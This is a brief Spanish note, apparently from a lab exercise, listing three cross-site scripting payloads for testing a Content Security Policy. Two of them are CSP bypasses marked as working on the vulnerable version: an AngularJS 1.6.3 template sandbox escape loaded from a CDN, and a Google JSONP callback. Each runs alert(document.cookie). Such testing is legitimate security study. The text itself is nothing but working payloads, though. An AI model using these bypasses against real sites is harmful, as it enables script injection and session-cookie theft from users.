este deberia fallar en los 2 casos por que en teoria no deberia ejecutarse ningun script 
<script>alert(1)</script>

en el vulnerable funciona
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.3/angular.min.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(document.cookie)')()}}</div>

en el vulnerable funciona
<script src="https://www.google.com/complete/search?client=chrome&q=test&jsonp=alert(document.cookie)//"></script>